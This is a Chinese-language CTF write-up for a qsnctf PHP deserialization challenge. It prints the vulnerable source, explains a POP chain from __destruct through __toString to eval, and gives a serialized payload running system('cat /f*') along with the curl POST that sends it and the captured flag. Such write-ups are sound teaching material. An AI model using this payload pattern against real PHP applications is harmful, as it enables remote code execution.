# WP · qsnctf 反序列化 POP 链（eval 代码执行）

- 链接：`http://challenge.qsnctf.com:40515/serialize.php`
- 类型：PHP 反序列化 + POP 链 + `__destruct` / `__toString` 魔法方法 + `eval` 代码执行
- Flag：`flag{544d4a6f5fc54e888f0862c8ff8de015}`

## 1. 源码（已用 highlight_file 自曝，去掉高亮标签）

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class GIT {
    public $username;
    public $password;
    public function __construct(){
        $this->username = 'guest';
        $this->password = 'Welcome to GITCTF!';
    }
    public function __destruct(){
        if($this->username == 'ZeroZone'){
            echo $this->password;
        } else {
            echo 'ZeroZone Lab new bee !';
        }
    }
}

class ZeroZone {
    public $code;
    public function __toString(){
        if(isset($this->code)){
            eval($this->code);          // ⭐ 代码执行点
            return '';
        } else {
            echo "代码呢？";
            return '';
        }
    }
}

$data = new GIT();
if(isset($_POST['data'])){
    $data = unserialize($_POST['data']);   // ⭐ 入口：POST 传 data
}
```

## 2. 漏洞分析

- 入口是 `unserialize($_POST['data'])`，**没有黑名单**，我们完全控制反序列化出的对象。
- 源码里**没有** `echo $flag`，也没有 `include("flag.php")` —— 直接读 flag 这条路不存在。
- 但 `ZeroZone::__toString()` 里有 `eval($this->code)` —— 这是**代码执行**的口子。
- 关键串联点：`GIT::__destruct()` 会 `echo $this->password`。如果让 `$password` 的值**是一个 `ZeroZone` 对象**，那么 `echo` 这个对象就会触发它的 `__toString()` → 进而 `eval($this->code)`。

这就是一条 **POP 链（Property-Oriented Programming）**：

```
GIT 对象销毁 → __destruct() → echo $password
                              ↑ password 是 ZeroZone 对象
        ZeroZone 被 echo → __toString() → eval($code) → 执行我们注入的命令
```

## 3. 构造目标

我们需要一个 `GIT` 对象：

- `$username = 'ZeroZone'`（满足 `__destruct` 的 if 条件，才会 `echo $password`）
- `$password = ZeroZone 对象`，其 `$code = "system('cat /f*');"`（执行系统命令读根目录的 /flag；本题服务器根目录有 /flag 文件）

## 4. 序列化 payload

手写（长度已核对）：

```
O:3:"GIT":2:{s:8:"username";s:8:"ZeroZone";s:8:"password";O:8:"ZeroZone":1:{s:4:"code";s:18:"system('cat /f*');";}}
```

字段核对：

| 片段 | 含义 | 长度 |
|---|---|---|
| `O:3:"GIT"` | 类名 GIT（3 字母） | — |
| `s:8:"username"` / `s:8:"ZeroZone"` | 属性名 / 值 | 8 / 8 |
| `s:8:"password"` | 属性名 | 8 |
| `O:8:"ZeroZone"` | 嵌套对象，类名 ZeroZone（8 字母） | — |
| `s:4:"code"` / `s:18:"system('cat /f*');"` | 属性名 / 值 | 4 / 18 |

> 也可以用 `serforge.py` 构造（支持嵌套对象）：
> `python serforge.py '{"__class__":"GIT","username":"ZeroZone","password":{"__class__":"ZeroZone","code":"system(\"cat /f*\");"}}'`

## 5. 发送（POST）

注意本题是 `$_POST['data']`，不是 GET：

```bash
curl -s -X POST "http://challenge.qsnctf.com:40515/serialize.php" \
  --data-urlencode 'data=O:3:"GIT":2:{s:8:"username";s:8:"ZeroZone";s:8:"password";O:8:"ZeroZone":1:{s:4:"code";s:18:"system('"'"'cat /f*'"'"');";}}'
```

返回末尾：`...ZeroZone Lab new bee !flag{544d4a6f5fc54e888f0862c8ff8de015}`

## 6. 学到的点

1. 反序列化题先找**魔法方法**里的危险函数（`__destruct`/`__wakeup`/`__toString`/`__get` 等），它们会自动触发。
2. 危险点（`eval`/`system`/文件操作）不一定在入口类，常藏在另一个类的魔法方法里 → 需要**构造属性类型**把两个类"串"起来，这就是 POP 链。
3. `echo` 一个对象会触发 `__toString()`；把对象塞进会被 echo/字符串拼接的属性，就能让链跑起来。
4. 本题无黑名单，`flag`/`php` 等词随便写；读文件用 `system('cat /f*')` 通配符即可（之前学的技巧复用）。
5. 入口是 POST 就用 POST 发，参数名 `data` 要对上。
